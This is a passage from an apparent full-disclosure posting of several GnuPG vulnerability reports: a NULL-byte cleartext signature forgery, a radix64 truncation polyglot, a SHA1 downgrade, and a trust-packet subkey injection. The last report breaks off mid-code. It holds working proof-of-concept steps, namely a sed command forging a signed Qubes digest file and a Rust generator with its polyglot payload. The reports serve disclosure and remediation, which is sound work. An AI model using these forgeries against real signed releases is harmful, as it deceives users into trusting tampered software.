 1cz3lqbZRTnvGwYndM5tJ1/gtfkKErfFV352Zc3Oo7OElTeKe/Dnin9auORqyYGWl5OKf+yYUVkS
 XhN3evs01rfDk3qW1+HWFQ2J5Edzvx2/1KvNW1KmPJH5Zb+DjZ8NOlp1/vrA2wgEqka4YOLr+1dj
 J5Km3B1WP9G+s4lVcFsQEiylKYeCcZM62/A5uWtf2ZIfI+pv5a0cCVn64t39A5b39bHHzub9tPTa
 xerP45/e7KB8ADh75gfrpwqUp9vNIaOC3c3JHDgw4njqzHmZozoLmpe9A1KYl8jZSzMvL9kCbL16
 rnM+VfZy+LnxhMoFj19j5624dYuT2jT9SNiZdsKTsdd4VI76//tv7BOf+MQnPvGJT3ziE5/4xCf+
 ffwHuCKCaQAoAAA=

References

   Visible links
   . https://seclists.org/fulldisclosure/

--EVF5PPMfhYS0aIcm
Content-Type: text/plain; charset=utf-8
Content-Disposition: attachment; filename="10-nullbyte.txt"
Content-Transfer-Encoding: 8bit

                      Cleartext Signature Forgery in GnuPG

   A vulnerability in GnuPG allows for stuffing additional data in the
   Cleartext Signature Framework.

Impact

   Exploitation allows for appending additional data after a valid BEGIN PGP
   SIGNED MESSAGE Armor Header Line and thereby potentially deceiving a GnuPG
   user about the actual signed data while preserving cryptographic
   integrity.

Details

   As highlighted in the Issues with the Cleartext Signature Framework, there
   is the risk of an attacker including misleading text in the Hash Armor
   Header and implementations shall therefore apply strict validation:

     Finally, when a Cleartext Signature Framework message is presented to
     the user as is, an attacker can include additional text in the Hash
     header, which may mislead the user into thinking it is part of the
     signed text. The signature validation constraints described in Sections
     6.2.2.3 and 7.1 help to mitigate the risk of arbitrary or misleading
     text in the Armor Headers.

   GnuPG fails to implement these signature validation constraints correctly,
   as it is possible to inject arbitrary data in the Hash armor header after
   a NULL byte.

   GnuPG implements the armor header validation in static int
   parse_hash_header( const char *line ) in gnupg/g10/armor.c. The function
   accepts a C-style string as its only parameter. parse_hash_header is
   called from parse_header_line, which passes strings split by line
   terminators. However, no splitting is done on NULL bytes. Without extra
   length information which are not passed along, there is no way to find the
   actual end of a C string in this scenario.

   The vulnerability arises from breaking, with a non-zero value in found,
   when a NULL byte is encountered after the hash name:

 /****************
  * check whether the armor header is valid on a signed message.
  * this is for security reasons: the header lines are not included in the
  * hash and by using some creative formatting rules, Mallory could fake
  * any text at the beginning of a document; assuming it is read with
  * a simple viewer. We only allow the Hash Header.
  */
 static int
 parse_hash_header( const char *line )
 {
     const char *s, *s2;
     unsigned found = 0;

     if( strlen(line) < 6  || strlen(line) > 60 )
         return 0; /* too short or too long */
     if( memcmp( line, "Hash:", 5 ) )
         return 0; /* invalid header */

     for(s=line+5;;s=s2) {
         for(; *s && (*s==' ' || *s == '\t'); s++ )
             ;
         if( !*s )
             break;
         for(s2=s+1; *s2 && *s2!=' ' && *s2 != '\t' && *s2 != ','; s2++ )
             ;
   if( !strncmp( s, "RIPEMD160", s2-s ) )
             found |= 1;
         else if( !strncmp( s, "SHA1", s2-s ) )
             found |= 2;
         else if( !strncmp( s, "SHA224", s2-s ) )
             found |= 8;
         else if( !strncmp( s, "SHA256", s2-s ) )
             found |= 16;
         else if( !strncmp( s, "SHA384", s2-s ) )
             found |= 32;
         else if( !strncmp( s, "SHA512", s2-s ) )
             found |= 64;
         else
             return 0;
         for(; *s2 && (*s2==' ' || *s2 == '\t'); s2++ )
             ;
         if( *s2 && *s2 != ',' )
             return 0;
         if( *s2 )
             s2++;
     }
     return found;
 }

   Due to breaking, once a NULL byte is processed, it is possible to append
   additional data in the Hash armor header in an attempt to deceive a user
   into believing it to be a part of the data bound under the signature. The
   risk of this happening is correctly pointed out by the comment above the
   function. However, the function implementation in combination with its
   call site in parse_header_line violates this.

Detailed steps to reproduce

  Scenario

   Bob wants to download and verify a Qubes OS ISO signed by Alice. Over a
   trusted channel, Bob obtains Alice’s key, in our example, the release
   signing key of the project. Bob imports and trusts it. Over an untrusted
   channel, on which Mallory has an MITM role, Bob proceeds to download the
   Qubes-R4.2.4-x86_64.iso alongside the signed checksum file. During the
   download, Mallory switches out both files for manipulated ones.

  Procedure

 $ echo "malicious Qubes iso, that the Qubes maintainers would never sign" > Qubes-R4.2.4-x86_64.iso
 $ sha512sum *Qubes-R4.2.4-x86_64.iso
 92e0148fc8874509d33d049a9b46e7fb5837d2f9466692b88904b84595426cfd65e842509d2faaa9bf067824d21e18fc2b646f4905182fe67e1ae9143bed05a6  Qubes-R4.2.4-x86_64.iso
 $ cat Qubes-R4.2.4-x86_64.iso.DIGESTS | sed 's/SHA256.*/..
 .
 .92e0148fc8874509d33d049a9b46e7fb5837d2f9466692b88904b84595426cfd65e842509d2faaa9bf067824d21e18fc2b646f4905182fe67e1ae9143bed05a6 Qubes-R4.2.4-x86_64.iso/' > Qubes-R4.2.4-x86_64.iso.DIGESTS

   Mallory can use any character in her injected message, except the \\n
   character. Instead, she uses alternative characters that also print as a
   newline in this example.

   Bob then receives the file, and compares the sha512 matching.

 $ gpg --verify Qubes-R4.2.4-x86_64.iso.DIGESTS
 gpg: Signature made Mon 17 Feb 2025 06:00:00 AM CET
 gpg:                using RSA key 9C884DF3F81064A569A4A9FAE022E58F8E34D89F
 gpg: Good signature from "Qubes OS Release 4.2 Signing Key" [ultimate]
 $ sha512sum *Qubes-R4.2.4-x86_64.iso
 92e0148fc8874509d33d049a9b46e7fb5837d2f9466692b88904b84595426cfd65e842509d2faaa9bf067824d21e18fc2b646f4905182fe67e1ae9143bed05a6  Qubes-R4.2.4-x86_64.iso
 $ cat Qubes-R4.2.4-x86_64.iso.DIGESTS
 -----BEGIN PGP SIGNED MESSAGE-----
 Hash: SHA256

 92e0148fc8874509d33d049a9b46e7fb5837d2f9466692b88904b84595426cfd65e842509d2faaa9bf067824d21e18fc2b646f4905182fe67e1ae9143bed05a6 *Qubes-R4.2.4-x86_64.iso

 6d28eed5e3a2f1e06b1dbdb52713deb8 *Qubes-R4.2.4-x86_64.iso
 ede51181709b2e0a69b87cfd7b8db1f36ef69515 *Qubes-R4.2.4-x86_64.iso
 f596adc4c40f2670321de0c41e65a4b94193ca77959149c62bcc2579425fac8e *Qubes-R4.2.4-x86_64.iso
 949589751e8d4794274b4889dd94f50823b39011e2b8b0afa3b4b7fd204042baf640f1af4241dae42193cf33a9721600402a2f258397a2c81f20241576640607 *Qubes-R4.2.4-x86_64.iso
 -----BEGIN PGP SIGNATURE-----

 iQIzBAEBCAAdFiEEnIhN8/gQZKVppKn64CLlj4402J8FAmeywlAACgkQ4CLlj440
 2J8jAg/+LY+/3fOyfbwjc8zkB+scnHv/BBxMB4o4hZrwFVfOt8d+ar34P1gvRDcG
 GFkp7J4jjPU3Lrcdm2nzX0/uyrHrZq7TOvrWpyFn5IffyX8r2ltIF0SBld4Uvbhr
 K8RPzJXTuFf1RrjcCngA24Go8aP0C4LL04PQNzCoXxMicqc+rDsk2zMQA/DdYE7S
 2WZVkeuaUnRa31oxNJW7Di1UpPJxFBP/aTrii4e06hzqodtko+kxt9aAi8b47DO2
 6g89H617zIXvcDfS/IAO8W7D+0If5WtLQyVGbeoNN+NOf14tE2wh18QtvVQmccVP
 t23+aQz4AT6j49jDd0iUYbbcgyia2wvY4C4QfR5+ZaZaee5DfuJEgRIRBv+BQrCE
 iG4o1HbsRXDpwZCHX3w99cVPpcYQzB0Xu1qR7zTNrXZBcgc5XffDoS0vzn57Id/7
 wwXsSVTbdGjnFFffL8s5aOr5tH22QbqBcMYmF5OA/9QPdkX40oZDE6SFwRqQHS3t
 OVsVAcv1r45NWWSRAjksviz91i7kMtl2KnP98imrdAUr/k21XupvxTVI5RgPF0DG
 EWNIGsHZnSY9k2HqEl6+FYTH4hZBreaFGyASuk/lDjIYtGAz0IJERw6kFsIJ14YT
 BGC8Kc0ysaLOcUCq4WTb0M1U8ePH41mtAxiz2LrLqT5MCkZ/yQI=
 =YecE
 -----END PGP SIGNATURE-----

  Discussion

   Other attacks are possible with the vulnerability include adding a
   different file, for example in this modified BSD download, where a
   FreeBSD-14.2-RELEASE-amd64-universal.iso file is inserted.

 -----BEGIN PGP SIGNED MESSAGE-----
 Hash: SHA512

 SHA256 (FreeBSD-14.2-RELEASE-amd64-universal.iso) = 2f1f6cf637397e205a1f7ff5058747256424e3a9c2e30fea129ece5c324ebd7b

 SHA256 (FreeBSD-14.2-RELEASE-amd64-bootonly.iso) = d063e48b81b99005c8097e60377c23fb07e4116c5f0c0b41a5dc368fc4df6bf9
 SHA256 (FreeBSD-14.2-RELEASE-amd64-bootonly.iso.xz) = f3668cd0f3dd503f58047ac098b3dd6d1962bb4e8f8ff3fb6abb632ef2d5f8f9
 SHA256 (FreeBSD-14.2-RELEASE-amd64-disc1.iso) = a3c771e2fa958e922a5771047d524d7df3ce501e58bed5c65f0226e4d31ebd30
 SHA256 (FreeBSD-14.2-RELEASE-amd64-disc1.iso.xz) = e64212a911ecb204083198aca3b64b6d50d5295c8de4d98b66553292024bac7c
 SHA256 (FreeBSD-14.2-RELEASE-amd64-dvd1.iso) = b158612828166e5fb7b34a76718387b0ed40ef425cfdb88a067aa349713dcae4
 SHA256 (FreeBSD-14.2-RELEASE-amd64-dvd1.iso.xz) = d1c874fd5ba8e9f0c26737d8b1c2304c14ea6c6ff5b71a572b731f9c21223f8a
 SHA256 (FreeBSD-14.2-RELEASE-amd64-memstick.img) = 90121a72477a3d74cf4d2d3715836b7624f4a8cdaa08b8131faa88e21b15b32b
 SHA256 (FreeBSD-14.2-RELEASE-amd64-memstick.img.xz) = b1636d6d72932df2eb757cc0b1ea1e7d532c895c960518c74063cbadce020de2
 SHA256 (FreeBSD-14.2-RELEASE-amd64-mini-memstick.img) = ecb3477acbe8b8b6150a4248a5facddf2d3aac1e9cb507e6bec3a9c0b51f7769
 SHA256 (FreeBSD-14.2-RELEASE-amd64-mini-memstick.img.xz) = 40ee8c07704945e3bfa52e8dd9d354eb60a3240ab86a606191c280dabdff5eb6
 -----BEGIN PGP SIGNATURE-----

 iQIzBAEBCgAdFiEEglY7hNBiDtwN+4ZBOJfy4i5lrT8FAmdKDr4ACgkQOJfy4i5l
 rT8IAA//fWQQvtYyWzFV2mVjsCi8pi1gu/Wl4fd4KxXVpVLWky5tCJcOkBsF97IU
 eaZpq1P86bUwXz20nekypzO8RHSR37KKOXRIS5pP5PUiuGR0B3Fh6FOj0LygckTl
 mC1+VnWQu2XhQ6W7kN3nEyx2YznDe9TyeKpjlVnVCRG4FEI2r2jHJpgY69itwN9B
 47Ec2ude0JimCawHxTyMCfbXsPtvcE4mPLMc/2Z3VdgHFKpp//S0rDbkJ6080Oln
 FOq0BWHNSsQPLAWo63UwpmfgYykzjOd+2j1skbW8yiy+Ia+f7heJaremUR9GdeJL
 bQddM+BAB64bw8wp5ooTctPWhgwmaSmVyEh8KKY9EIFo6TmzyWgq2YmixbiAhN4g
 uAOx7+t4rmzh/TnxAwavTXSJp6/vhYD4EfoOHLPOy2zME5YoMNa8Kj/Y9UOVPhoz
 OjN10QSv1/P7zrLDA6Qp4IZ7FAGs+E3tTiEvXs7To7bHPhnxxfuK1I7r20pK27a7
 gBK/qlVys8VWzBYvdjUAIx/JWD4u5SQ5C+VNSuyYqH5WFuOmmKAYpRRntfovNLUF
 Tb7dYSJup+Q/fMTg/6hEKxN7/udKIYD/WoV9ik896cwFgtYrkdkGdKJybCE1M9GF
 HKkEa3VeMKJkVzY5lOHA9nqkQOUCdCx3EaW6orEvc+R1p6xE6Fg=
 =q66Y
 -----END PGP SIGNATURE-----

   Generally, the inserted text follows the hash header + a null byte,
   can’t contain a newline, and is terminated by a newline. This constraint
   may catch the malicious injection when parsing a file with a 3rd party
   downstream tool, such as some implementations of the sha512sum utility.
   The vulnerability is applicable to exploitation scenarios beyond hash
   digest verification.

Recommendation

   Removal of the Cleartext Signature Framework from the OpenPGP standard
   helps resolve the issues with the Cleartext Signature Framework.
   Furthermore, deprecation allows for a graceful phase-out.

   OpenPGP users should avoid using cleartext signatures, as is also
   recommended by GnuPG.

   GnuPG should implement the signature validation constraints from the RFC
   to mitigate the issues with the Cleartext Signature Framework.

   To prevent confusion about the actual signed data, OpenPGP implementations
   should output the data bound by the signature during validation by
   default. sequoia-sq does so. GnuPG does not and requires the --output
   option to be set.

   When working with OpenPGP signatures in general, users should instruct
   their PGP implementation to output the signed data and only use this
   output for any further or related tasks.

References

   Visible links
   . https://www.rfc-editor.org/rfc/rfc9580.html#name-armor-header-line
   . https://www.rfc-editor.org/rfc/rfc9580.html#section-7.3-7
   . https://www.rfc-editor.org/rfc/rfc9580.html#section-6.2.2.3
   . https://www.rfc-editor.org/rfc/rfc9580.html#section-7.1
   . https://github.com/gpg/gnupg/blob/49d2dde69667dc50af98e2addb8d4e0aa5a876de/g10/armor.c#L329C1-L351C12
   . https://keys.qubes-os.org/keys/qubes-release-4.2-signing-key.asc
   . https://mirrors.edge.kernel.org/qubes/iso/Qubes-R4.2.4-x86_64.iso
   . https://mirrors.edge.kernel.org/qubes/iso/Qubes-R4.2.4-x86_64.iso.DIGESTS
   . https://www.rfc-editor.org/rfc/rfc9580.html#name-issues-with-the-cleartext-s
   . https://www.rfc-editor.org/rfc/rfc9580.html#name-issues-with-the-cleartext-s

--EVF5PPMfhYS0aIcm
Content-Type: text/plain; charset=utf-8
Content-Disposition: attachment; filename="11-polyglot.txt"
Content-Transfer-Encoding: 8bit

               Radix64 Line-Truncation Enabling Polyglot Attacks

   GnuPG drops data, causing the same OpenPGP message to be interpreted
   differently by GnuPG and parsers adhering to the specification.

Impact

   An attacker can craft ASCII-armored OpenPGP data that contains an
   over-long radix64 line. It will be interpreted differently by GnuPG than
   by spec-conforming parsers. This enables format-confusion / polyglot
   attacks where a section of a long line is dropped by GnuPG but processed
   by other implementations, so the effective plaintext and packet sequence
   differ across implementations. Downstream effects include:

     * Appending attacker-chosen bytes to earlier packets when viewed by
       GnuPG, while a correct implementation treats them as a separate
       packet.
     * Producing different decrypted outputs across implementations for the
       same armored blob.

   OpenPGP’s armor rules require decoders to ignore all whitespace in
   radix64 (and armor line lengths are a presentation constraint, not a
   semantic one). The observed behavior violates that expectation.

Details

   OpenPGP’s ASCII armor (“radix-64”) is a base64 transport encoding
   format. The RFC describes formation of armor and its base64 decoding

     When decoding base64, an OpenPGP implementation MUST ignore all
     whitespace.

   Since implementations are required to discard whitespace, the meaning of
   the data should not be affected by line length or location of newline
   characters.

   Additionally, the RFC imposes a maximum line length for the base64 encoded
   data in the armor body of 76 characters per line.

   GnuPG’s armor decoder, radix64_read reads the radix64 stream line by
   line using a fixed MAX_LINELEN and a buffered iobuf_read_line. If a line
   exceeds this limit, the code truncates the line (sets afx->truncated++)
   and continues with the next line, effectively discarding the tail of the
   over-long line instead of continuing to collect any remaining base64
   encoded data.

 static int radix64_read(armor_filter_context_t* afx, IOBUF a, size_t* retn,
                         byte* buf, size_t size) {
         byte val;
         int c;
         u32 binc;
         int checkcrc = 0;
         int rc = 0;
         size_t n = 0;
         int idx, onlypad = 0;
         int skip_fast = 0;

         idx = afx->idx;
         val = afx->radbuf[0];
         for (n = 0; n < size;) {
                 if (afx->buffer_pos < afx->buffer_len) c = afx->buffer[afx->buffer_pos++];
                 else {
                         /* read the next line */
                         unsigned maxlen = MAX_LINELEN;
                         afx->buffer_pos = 0;
                         afx->buffer_len = iobuf_read_line(a, &afx->buffer,
                                                           &afx->buffer_size, &maxlen);
                         if (!maxlen) afx->truncated++;
                         if (!afx->buffer_len) break; /* eof */
                         continue;
                 }
     // ...
   }
 }

   As a result, an attacker can craft an armor body of the following
   structure:

 [1. first 19998 characters][2. overlong tail of same line]
 [3. next line]

     * Correct implementations (whitespace-agnostic) decode 1 + 2 + 3, or
       choose not to accept the overlong line exeeding the 76 character
       limit.
     * GnuPG decodes 1 + 3, dropping 2. Instead of failing explicitly with an
       error message, only a warning is printed.

   This makes it possible to craft a blob that decrypts/parses as two
   different packet layouts depending on the implementation. A practical
   construction:

     * “2” and “3” have the same length.
     * “3” is a valid packet on its own.
     * “1” includes a packet whose declared length covers (1 + 2).
     * The base64 for “1” is exactly 19998 characters, so truncation
       happens between “1” and “2”.

   Then:

     * GnuPG appends “3” behind “1“‘s packet body (since it dropped
       “2”).
     * A correct implementation appends “2” behind “1” as intended
       and parses “3” as a separate packet.

  Detailed steps to reproduce

   A minimal payload triggers the split behavior:

   GnuPG drops the tail of the over-long line and complains about the armor,
   but still emits partial data (“meow…”) before bailing; Sequoia (sq)
   processes the entire base64 stream as specified in the RFC and outputs
   both fragments.

 $ echo "H4sIAAAAAAACA+3cOwrCQAAE0H5P4QWCrY3FapZoYYgEFdsQUFALQWJyez+Ngr3Ve80Mc4jJsqdZKpblqCqq0SrVdSzSa8xCGMZhEmN+Pe0P8a3Zbbv2HgEAAAAAAAAAAAAAAAAAAAAAAAD4s/nleG6Kvlsuyn5++Oxh6CavzDepXX/3MI39rQvvf7lU5j+fcw9xRmuwj04AAA=="
   | base64 -d
   | gunzip > polyglot

 $ sq decrypt polyglot
 meow
 hello sq
 0 authenticated signatures.

 $ gpg --decrypt polyglot
 meow��PGP��PGPgpg: invalid armor: line longer than 20000 characters

   The payload was generated with:

 //! ```cargo
 //! [dependencies]
 //! sequoia-openpgp = "2.0.0"
 //! simple-base64 = "0.23.2"
 //! ```

 use sequoia_openpgp::serialize::stream::{Armorer, Message};
 use sequoia_openpgp::serialize::{MarshalInto, Serialize};
 use sequoia_openpgp::types::DataFormat::Binary;
 use sequoia_openpgp::Packet;
 use sequoia_openpgp::packet::header::CTBNew;
 use sequoia_openpgp::packet::{Literal, Tag};

 fn main() {
     let mut nop_sled = CTBNew::new(Tag::Marker).to_vec().unwrap();
     nop_sled.append(&mut [255, 0, 0, 0, 3].to_vec());
     nop_sled.append(&mut b"PGP".to_vec());
     assert_eq!(nop_sled.len() % 3, 0);

     let inner_size = 20000 // GPG line length
         / 4 * 3 // base64 conversion
         - 12; // length of header

     let mut text = b"meow".to_vec();
     text.pad_to(inner_size, 0);

     let mut after = b"\nhello sq\n".to_vec();
     after.pad_to(nop_sled.len(), 0);

     let mut after_sleds = vec![];
     while after_sleds.len() < after.len() {
         after_sleds.append(&mut nop_sled.clone());
     }

     let mut text_long = text.clone();
     text_long.append(&mut after.clone());

     let mut text_sleds = text.clone();
     text_sleds.append(&mut after_sleds.clone());

     let crcd = {
         let mut buf = vec![];
         let msg = Message::new(&mut buf);
         let mut msg = Armorer::new(msg).build().unwrap();

         let mut lit = Literal::new(Binary);
         lit.set_body(text_sleds);
         Packet::from(lit).serialize(&mut msg).unwrap();

         msg.finalize().unwrap();
         buf
     };
     let crcd = String::from_utf8(crcd).unwrap();
     let mut lines = crcd.lines();
     let start = lines.next().unwrap();
     let mut lines = lines.rev();
     let end = lines.next().unwrap();
     let crc = lines.next().unwrap();

     let mut text_long_lit = Literal::new(Binary);
     text_long_lit.set_body(text_long);
     let mut text_long_pkt = vec![];
     Packet::from(text_long_lit).serialize(&mut text_long_pkt).unwrap();

     let mut text_long_b64 = simple_base64::encode(text_long_pkt);
     text_long_b64.insert(2, '\n'); // fix the off-by-two in GPG (it cuts off at 19998)

     let after_sleds_b64 = simple_base64::encode(after_sleds);

     let result = format!("{start}\n\n{text_long_b64}\n{after_sleds_b64}\n{crc}\n{end}");

     std::fs::write("./polyglot", result).unwrap();

     println!("./polyglot written. try:\n\tgpg --decrypt ./polyglot\n\tsq decrypt ./polyglot");
 }

 trait PadTo<I> {
     fn pad_to(&mut self, to: usize, with: I);
 }

 impl<T: Clone> PadTo<T> for Vec<T> {
     fn pad_to(&mut self, to: usize, with: T) {
         let mut padding = vec![with; (to - self.len() % to) % to];
         self.append(&mut padding);
     }
 }

Recommendation

   To avoid vulnerabilities arising from divergent interpretations of the
   same RFC, all implementations should strictly adhere to the specification.
   In particular, GnuPG should not truncate overlong lines. When imposing
   reasonable restrictions (such as a maximum line length), an implementation
   must not ignore or truncate excessive input; instead, it should fail
   explicitly with an error.

References

   Visible links
   . https://www.rfc-editor.org/rfc/rfc9580.html#section-6-4
   . https://www.rfc-editor.org/rfc/rfc9580.html#name-base64-conversions

--EVF5PPMfhYS0aIcm
Content-Type: text/plain; charset=us-ascii
Content-Disposition: attachment; filename="12-sha1.txt"

   GnuPG may downgrade digest algorithm to SHA1 during key signature checking

   GnuPG may downgrade the message digest algorithm to insecure SHA1
   algorithm during signature checking due to reading from uninitialized
   memory.

Impact

   check_signature_over_key_or_uid can read from uninitialized memory which
   may lead to setting the message digest algorithm to SHA1. This reduces the
   security of User ID Certification Signatures to that of SHA1. SHA1 suffers
   from known cryptographic weaknesses like chosen prefix attacks.

   This affects the following calls to check_signature_over_key_or_uid:

     * User ID certification signatures:
       https://github.com/gpg/gnupg/blob/master/g10/sig-check.c#L1260
     * Potentially this logic in the subkey binding code:
       https://github.com/gpg/gnupg/blob/master/g10/keylist.c#L2339

Details

   Cryptographic signatures are not computed over the message itself, but
   over an aggregated cryptographic hash of the message. This hash is known
   as the digest (of the message). At the core of checking many kinds of
   signatures in GnuPG is the function check_signature_over_key_or_uid. For
   the aforementioned signature types a call to
   check_signature_over_key_or_uid with both the parameters is_selfsig and
   signer being NULL is possible. This can lead to the following:

     * [1.1], [1.1] is_selfsig will point to uninitialized stack memory
     * [2] *is_selfsig is never written to
     * [3] *is_selfsig is read in the condition that should disallow the weak
       SHA1 algorithm, except for self signatures. However, *is_selfsig can
       be any value at this point since it is uninitialized. Any value other
       than 0 will lead to skipping this crucial check.

 /* Returns whether SIGNER generated the signature SIG over the packet
  * PACKET, which is a key, subkey or uid, and comes from the key block
  * KB.  (KB is PACKET's corresponding keyblock; we don't assume that
  * SIG has been added to the keyblock.)
  *
  * If SIGNER is set, then checks whether SIGNER generated the
  * signature.  Otherwise, uses SIG->KEYID to find the alleged signer.
  * This parameter can be used to effectively override the alleged
  * signer that is stored in SIG.
  *
  * KB may be NULL if SIGNER is set.
  *
  * Unlike check_key_signature, this function ignores any cached
  * results!  That is, it does not consider SIG->FLAGS.CHECKED and
  * SIG->FLAGS.VALID nor does it set them.
  *
  * This doesn't check the signature's semantic mean.  Concretely, it
  * doesn't check whether a non-self signed revocation signature was
  * created by a designated revoker.  In fact, it doesn't return an
  * error for a binding generated by a completely different key!
  *
  * Returns 0 if the signature is valid.  Returns GPG_ERR_SIG_CLASS if
  * this signature can't be over PACKET.  Returns GPG_ERR_NOT_FOUND if
  * the key that generated the signature (according to SIG) could not
  * be found.  Returns GPG_ERR_BAD_SIGNATURE if the signature is bad.
  * Other errors codes may be returned if something else goes wrong.
  *
  * IF IS_SELFSIG is not NULL, sets *IS_SELFSIG to 1 if this is a
  * self-signature (by the key's primary key) or 0 if not.
  *
  * If RET_PK is not NULL, returns a copy of the public key that
  * generated the signature (i.e., the signer) on success.  This must
  * be released by the caller using release_public_key_parts ().  */
 gpg_error_t check_signature_over_key_or_uid(ctrl_t ctrl, PKT_public_key* signer,
                                             PKT_signature* sig, KBNODE kb, PACKET* packet,
                                             int* is_selfsig, PKT_public_key* ret_pk) {
   // ...
   int stub_is_selfsig; // <-- [1.1]

   if (!is_selfsig) is_selfsig = &stub_is_selfsig; // <-- [1.2]

   // ...

   if (signer) {
     // ...
   } else {
     /* Get the signer.  If possible, avoid a look up.  */
     if (sig->keyid[0] == pripk->keyid[0]
       && sig->keyid[1] == pripk->keyid[1]) {
       // ...
     } else { // <-- [2]
       /* See if one of the subkeys was the signer (although this
        * is extremely unlikely).  */
       kbnode_t ctx = NULL;
       kbnode_t n;

       while ((n = walk_kbnode(kb, &ctx, 0))) {
         PKT_public_key* subk;

         if (n->pkt->pkttype != PKT_PUBLIC_SUBKEY) continue;

         subk = n->pkt->pkt.public_key;
         if (sig->keyid[0] == subk->keyid[0]
           && sig->keyid[1] == subk->keyid[1]) {
           /* Issued by a subkey.  */
           signer = subk;
           break;
         }
       }

       if (!signer) {
         // ...
       }
     }
   }

   // ...

   if (IS_UID_SIG(sig) || IS_UID_REV(sig)) {
     log_assert(packet->pkttype == PKT_USER_ID);
     if (sig->digest_algo == DIGEST_ALGO_SHA1 && !*is_selfsig // <-- [3]
       && !opt.flags.allow_weak_key_signatures) {
       /* If the signature was created using SHA-1 we consider this
        * signature invalid because it makes it possible to mount a
        * chosen-prefix collision.  We don't do this for
        * self-signatures, though.  */
       print_sha1_keysig_rejected_note();
       rc = gpg_error(GPG_ERR_DIGEST_ALGO);
     } else {
       hash_public_key(md, pripk);
       hash_uid_packet(packet->pkt.user_id, md, sig);
       rc = check_signature_end_simple(signer, sig, md, NULL, 0);
     }
   }

   // ...

   return rc;
 }

   Since the issue is obvious from the code itself, we do not write a proof
   of concept for it.

Recommendations

    1. Always initialize memory before reading from it.
    2. Avoid code paths where variable initialization depends on complex
       control flow.
    3. Thoroughly test the program with memory sanitizer enabled
    4. Look through static analysis results that point out potential uses of
       uninitialized memory

   --------------------------------------------------------------------------

   Finder credits: 49016

   Disclosure Timeline:

     * 21.10.2025: Submission of initial version of this report.

   Upcoming Timeline:

     * 24.10.2025: Submission of a talk for 39th Chaos Communication Congress
       (39C3). No technical details shared.
     * 21.12.2025: Disclosure of this report on
       https://seclists.org/fulldisclosure/
     * 26-31.12.2025: If accepted by content team, 39C3 Congress talk
       regarding this report

   Please note: While we might be able to offer some flexibility, our plan is
   to adhere to the above stated upcoming timeline, regardless of the
   availability of patches or fixes.

   We kindly request allocation of a CVE number to track this issue. Please
   keep us updated regarding your remediation efforts.

   Thank you

   Best, Liam

References

   Visible links
   . https://datatracker.ietf.org/doc/html/rfc4880#section-5.2.4
   . https://github.com/gpg/gnupg/blob/master/g10/sig-check.c#L1260
   . https://github.com/gpg/gnupg/blob/master/g10/keylist.c#L2339
   . https://github.com/google/sanitizers/wiki/memorysanitizer
   . https://seclists.org/fulldisclosure/

--EVF5PPMfhYS0aIcm
Content-Type: text/plain; charset=utf-8
Content-Disposition: attachment; filename="13-trust.txt"
Content-Transfer-Encoding: 8bit

          GnuPG Trust Packet Parsing Enables Adding Arbitrary Subkeys

   An attacker can provide a forged keyring (via the --keyring parameter in
   GnuPG). Successful exploitation allows for injection of unauthorized,
   malicious encryption subkeys without necessitating the private component
   of the master key.

Impact

   Generally, the attack allows adding arbitrary subkeys to any key, for
   encryption or signing purposes, without necessitating authorization of the
   subkeys through a master key signature. This includes subkey addition to
   already trusted main keys from other keyrings.

Details

   GnuPG supports PGP trust packets. The PGP RFC fails to provide a
   comprehensive and precise specification of the packet format:

     The Trust packet is used only within keyrings and is not normally
     exported. Trust packets contain data that record the user’s
     specifications of which keyholders are trustworthy introducers, along
     with other information that implementation uses for trust information.
     The format of Trust packets is defined by a given implementation.

   Among other purposes, GnuPG employs PGP trust packets for caching the
   outcome of signature validation of PGP subkeys.

   Through forging a malicious keyring, an attacker can instruct GnuPG via
   the trust packet’s flags.checked [1] and flags.verified [2] bits to skip
   the signature validation of the preceding signature packet.

 /* Parse a ring trust packet RFC4880 (5.10).
  *
  * This parser is special in that the packet is not stored as a packet
  * but its content is merged into the previous packet.  */
 static gpg_error_t parse_ring_trust(parse_packet_ctx_t ctx, unsigned long pktlen) {
   // ...
   c = iobuf_get_noeof(inp);
   rt.trustval = c;
   if (!c) {
     c = iobuf_get_noeof(inp);
     /* We require that bit 7 of the sigcache is 0 (easier
      * eof handling).  */
     if (!(c & 0x80)) rt.sigcache = c;
   } else { /* ... */ };
   // ...
   /* Now transfer the data to the respective packet.  Do not do this
    * if SKIP_META is set.  */
   if (!ctx->last_pkt.pkt.generic || ctx->skip_meta);
   else if (rt.subtype == RING_TRUST_SIG
     && ctx->last_pkt.pkttype == PKT_SIGNATURE) {
     PKT_signature* sig = ctx->last_pkt.pkt.signature;

     if ((rt.sigcache & 1)) {
       sig->flags.checked = 1;                       // [1]
       sig->flags.valid = !!(rt.sigcache & 2);       // [2]
     }
   } else { /* ... */ }
   // ...
 }

   By crafting a packet that sets sigcache to 1 | 2, GnuPG sets the checked
   and valid flags of the last signature packet to true.

   These flags are used in various parts of the GnuPG code, but most notably
   in check_key_signature2 [3, 4]:

 /* Check that a signature over a key (e.g., a key revocation, key
  * binding, user id certification, etc.) is valid.  If the function
  * detects a self-signature, it uses the public key from the specified
  * key block and does not bother looking up the key specified in the
  * signature packet.
  *
  * ROOT is a keyblock.
  *
  * NODE references a signature packet that appears in the keyblock
  * that should be verified.
  *
  * If CHECK_PK is set, the specified key is sometimes preferred for
  * verifying signatures.  See the implementation for details.
  *
  * If RET_PK is not NULL, the public key that successfully verified
  * the signature is copied into *RET_PK.
  *
  * If IS_SELFSIG is not NULL, *IS_SELFSIG is set to 1 if NODE is a
  * self-signature.
  *
  * If R_EXPIREDATE is not NULL, *R_EXPIREDATE is set to the expiry
  * date.
  *
  * If R_EXPIRED is not NULL, *R_EXPIRED is set to 1 if PK has been
  * expired (0 otherwise).  Note: PK being revoked does not cause this
  * function to fail.
  *
  *
  * If OPT.NO_SIG_CACHE is not set, this function will first check if
  * the result of a previous verification is already cached in the
  * signature packet's data structure.
  *
  * TODO: add r_revoked here as well.  It has the same problems as
  * r_expiredate and r_expired and the cache [nw].  Which problems [wk]? */
 int check_key_signature2(ctrl_t ctrl,
                          kbnode_t root, kbnode_t node, PKT_public_key* check_pk,
                          PKT_public_key* ret_pk, int* is_selfsig,
                          u32* r_expiredate, int* r_expired) {
   PKT_public_key* pk;
   PKT_signature* sig;
   int algo;
   int rc;

   if (is_selfsig) *is_selfsig = 0;
   if (r_expiredate) *r_expiredate = 0;
   if (r_expired) *r_expired = 0;
   log_assert(node->pkt->pkttype == PKT_SIGNATURE);
   log_assert(root->pkt->pkttype == PKT_PUBLIC_KEY);

   pk = root->pkt->pkt.public_key;
   sig = node->pkt->pkt.signature;
